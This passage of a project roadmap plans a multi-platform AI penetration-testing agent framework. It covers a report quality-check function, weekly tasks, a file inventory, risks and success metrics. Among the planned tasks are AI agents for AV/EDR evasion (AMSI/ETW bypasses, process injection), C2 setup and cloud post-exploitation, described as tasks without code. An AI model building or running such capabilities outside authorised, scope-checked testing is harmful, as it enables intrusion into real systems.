    for pattern in credential_patterns:
        matches = re.findall(pattern, report_content, re.IGNORECASE)
        if matches:
            issues.append({"severity": "critical", "message": f"Possible credential leak: {pattern}"})
    
    # Check all findings have CVSS vectors
    findings = re.findall(r'\[CRITICAL\]|\[HIGH\]|\[MEDIUM\]|\[LOW\]', report_content)
    cvss_vectors = re.findall(r'CVSS:3\.1/AV:[NALP]/AC:[LH]/PR:[NLH]', report_content)
    if len(findings) != len(cvss_vectors):
        issues.append({"severity": "warning", "message": f"Mismatch: {len(findings)} findings but {len(cvss_vectors)} CVSS vectors"})
    
    # Check for ATT&CK mappings
    ttps = re.findall(r'T\d{4}(?:\.\d{3})?', report_content)
    if len(ttps) < len(findings):
        issues.append({"severity": "warning", "message": f"Some findings missing ATT&CK TTP mapping"})
    
    # Check for CWE references
    cwes = re.findall(r'CWE-\d+', report_content)
    if len(cwes) < len(findings):
        issues.append({"severity": "info", "message": f"Some findings missing CWE reference"})
    
    return {
        "score": max(0, 100 - sum(10 if i["severity"] == "critical" else 3 if i["severity"] == "warning" else 1 for i in issues)),
        "issues": issues,
        "total_findings": len(findings),
        "findings_with_cvss": len(cvss_vectors),
        "findings_with_ttp": len(ttps),
        "findings_with_cwe": len(cwes)
    }
```

---

## I. Implementation Roadmap

### Phase 1: Foundation (Week 1-2)

**Week 1:**
- [ ] Create `core/` directory structure
- [ ] Move all agent methodology to `core/agents/` (strip Claude frontmatter)
- [ ] Move rules to `core/rules/` (strip path-scoped frontmatter)
- [ ] Move skills to `core/skills/`
- [ ] Move hooks to `core/hooks/` (add standalone CLI mode to `scope_check.py`)
- [ ] Move scripts to `core/scripts/`
- [ ] Create `core/agents/_registry.json` metadata file
- [ ] Create `core/schema/` JSON schemas

**Week 2:**
- [ ] Build Claude Code adapter (`adapters/claude-code/`) with generation script
- [ ] Implement YAML scope support (`scope.yaml` loader in `scope_check.py`)
- [ ] Add subnet exhaustion detection
- [ ] Add time-based engagement windows
- [ ] Replace all CrackMapExec references with NetExec
- [ ] Build `build.py` generation script
- [ ] Test Claude Code adapter works identically to original

**Deliverable:** Claude Code adapter works exactly as original. Standalone scope checker has CLI mode. YAML scope support works.

### Phase 2: Agents & Platform Support (Week 3-4)

**Week 3:**
- [ ] Build GitHub Copilot adapter (`adapters/github-copilot/`)
- [ ] Build OpenCode adapter (`adapters/opencode/`)
- [ ] Build OpenClaw adapter (`adapters/openclaw/`) — consolidated skills
- [ ] Major overhaul of evasion agent (LOLBins catalog, AMSI/ETW bypasses, process injection, detection gaps)
- [ ] Add C2 operator configuration templates (Sliver YAML, Havoc profile, redirector setup)
- [ ] Add IoT attacker firmware analysis methodology

**Week 4:**
- [ ] Add mobile attacker Frida script templates
- [ ] Add wireless attacker expanded methodology (PMKID, BLE, WiFi 6)
- [ ] Create purple team agent
- [ ] Create vulnerability management agent
- [ ] Create cloud post-exploitation agent
- [ ] Create network segmentation testing agent
- [ ] Create red team infrastructure agent
- [ ] Add report writer templates (enterprise, API, mobile, red team, compliance)

**Deliverable:** 32 total agents (27 improved + 5 new). 4 platform adapters working.

### Phase 3: Tooling & Reports (Week 5-6)

**Week 5:**
- [ ] Build scope MCP server (`integrations/mcp/scope-mcp/`)
- [ ] Build evidence MCP server (`integrations/mcp/evidence-mcp/`)
- [ ] Build report MCP server (`integrations/mcp/report-mcp/`)
- [ ] Build `evidence_capture.py` (screenshot, PCAP, hash verification pipeline)
- [ ] Build evidence manifest system
- [ ] Build `evidence_export.py` (HTML, PDF, ZIP export)

**Week 6:**
- [ ] Build `report_generate.py` (automated report pipeline)
- [ ] Implement quality check system for reports
- [ ] Build n8n workflow templates (engagement-start, finding-sync, report-notification)
- [ ] Build OpenProject integration (`integrations/openproject/sync.py`)
- [ ] Update README.md with multi-platform instructions
- [ ] Update CLAUDE.md with new agents and tool references

**Deliverable:** Full report pipeline working. MCP servers functional. n8n and OpenProject integration live.

### Phase 4: Testing & Documentation (Week 7-8)

**Week 7:**
- [ ] Write comprehensive tests for `scope_check.py` (expand existing smoke tests)
- [ ] Write tests for `report_generate.py`
- [ ] Write tests for `evidence_capture.py`
- [ ] Write tests for MCP servers
- [ ] Integration test: run full engagement flow on each platform adapter
- [ ] Performance test: scope check with 1000+ targets in scope.txt

**Week 8:**
- [ ] Write CONTRIBUTING.md with adapter development guide
- [ ] Write AGENTS.md for new contributors
- [ ] Update README.md with final architecture diagram
- [ ] Create example engagement walkthrough for each platform
- [ ] Record demo video/GIF for README
- [ ] Tag v2.0.0 release
- [ ] Submit PR to upstream mukul975/ThreatSwarm (optional, if aligned with their roadmap)

**Deliverable:** Tested, documented, released ThreatSwarm v2.0.0 as multi-agent pentesting framework.

---

## Appendix A: File Change Inventory

### Files to Create
| Path | Description |
|------|-------------|
| `core/agents/purple-team.md` | Purple team agent |
| `core/agents/vuln-management.md` | Vulnerability management agent |
| `core/agents/cloud-postex.md` | Cloud post-exploitation agent |
| `core/agents/segmentation-tester.md` | Network segmentation agent |
| `core/agents/red-infra.md` | Red team infrastructure agent |
| `core/agents/_registry.json` | Agent metadata registry |
| `core/schema/scope.json` | Scope YAML schema |
| `core/schema/finding.json` | Finding schema |
| `core/schema/evidence.json` | Evidence manifest schema |
| `core/schema/agent_registry.json` | Agent registry schema |
| `core/hooks/evidence_capture.py` | Evidence capture utility |
| `core/hooks/scope_yaml.py` | YAML scope loader |
| `core/scripts/report_generate.py` | Report generator |
| `core/scripts/evidence_export.py` | Evidence exporter |
| `core/scripts/scope_validate.py` | Scope validation utility |
| `core/templates/default/` | Default report template set |
| `core/templates/enterprise/` | Enterprise report template set |
| `core/templates/api-security/` | API security report template |
| `core/templates/mobile-security/` | Mobile security report template |
| `core/templates/red-team/` | Red team report template |
| `core/templates/compliance/` | Compliance report template |
| `adapters/github-copilot/.github/copilot-instructions.md` | Copilot instructions |
| `adapters/github-copilot/workspace-rules/*.md` | Copilot workspace rules |
| `adapters/opencode/opencode.json` | OpenCode config |
| `adapters/opencode/instructions.md` | OpenCode instructions |
| `adapters/openclaw/skills/*/SKILL.md` | 15 OpenClaw skills |
| `integrations/mcp/scope-mcp/server.py` | Scope MCP server |
| `integrations/mcp/scope-mcp/config.json` | Scope MCP config |
| `integrations/mcp/evidence-mcp/server.py` | Evidence MCP server |
| `integrations/mcp/evidence-mcp/config.json` | Evidence MCP config |
| `integrations/mcp/report-mcp/server.py` | Report MCP server |
| `integrations/mcp/report-mcp/config.json` | Report MCP config |
| `integrations/n8n/*.json` | n8n workflow templates |
| `integrations/openproject/sync.py` | OpenProject integration |
| `build.py` | Adapter build script |
| `Makefile` | Build system |
| `scope.yaml` | Example YAML scope |

### Files to Modify
| Path | Change |
|------|--------|
| `CLAUDE.md` | Replace CrackMapExec with NetExec, add new agents to delegation table |
| `README.md` | Multi-platform instructions, new agents, updated architecture |
| `scope.txt` | Add example entries |
| `core/hooks/scope_check.py` | Add CLI mode, YAML support, subnet check, time windows |

### Files to Move (Original → Core)
| Original | Destination |
|----------|-------------|
| `.claude/agents/*.md` (27 files) | `core/agents/*.md` |
| `.claude/rules/*.md` (4 files) | `core/rules/*.md` |
| `.claude/skills/*/SKILL.md` (5 dirs) | `core/skills/*/SKILL.md` |
| `.claude/hooks/scope_check.py` | `core/hooks/scope_check.py` |
| `.claude/hooks/findings_sync.py` | `core/hooks/findings_sync.py` |
| `.claude/commands/*.md` (6 files) | `core/commands/*.md` |
| `scripts/batch_recon.sh` | `core/scripts/batch_recon.sh` |
| `scripts/smoke_hook_test.py` | `core/tests/test_scope_check.py` |
| `scripts/worktree_setup.sh` | `core/scripts/worktree_setup.sh` |

---

## Appendix B: Risk Assessment

| Risk | Probability | Impact | Mitigation |
|------|------------|--------|------------|
| Claude Code API changes break adapter | Medium | High | Pin Claude Code version, monitor changelog |
| OpenCode/OpenClaw adapter incomplete | Low | Medium | Prioritize Claude Code adapter, others as stretch goals |
| Agent quality inconsistent across platforms | Medium | Medium | Use build.py to generate from single source of truth |
| scope_check.py false positives | Low | High | Comprehensive test suite, real-world testing |
| Report pipeline generates low-quality output | Medium | Medium | Extensive quality checks, manual review option |
| Upstream merge conflicts | Medium | Low | Fork early, communicate with upstream, cherry-pick |

---

## Appendix C: Success Metrics

| Metric | Baseline | Target |
|--------|----------|--------|
| Supported platforms | 1 (Claude Code) | 4 (Claude Code, Copilot, OpenCode, OpenClaw) |
| Total agents | 27 | 32 (27 improved + 5 new) |
| Agent average line count | 280 | 400+ |
| Report templates | 1 (generic) | 6 (generic, enterprise, API, mobile, red team, compliance) |
| Output formats | 1 (Markdown) | 5 (Markdown, HTML, PDF, DOCX, SARIF) |
| Scope validation | Plain text only | Plain text + YAML + subnet check + time windows |
| Evidence integrity | Manual | Automated hash chain + manifest |
| External integrations | 0 | 3 (MCP servers, n8n, OpenProject) |
| Test coverage | 1 smoke test | 50+ unit/integration tests |
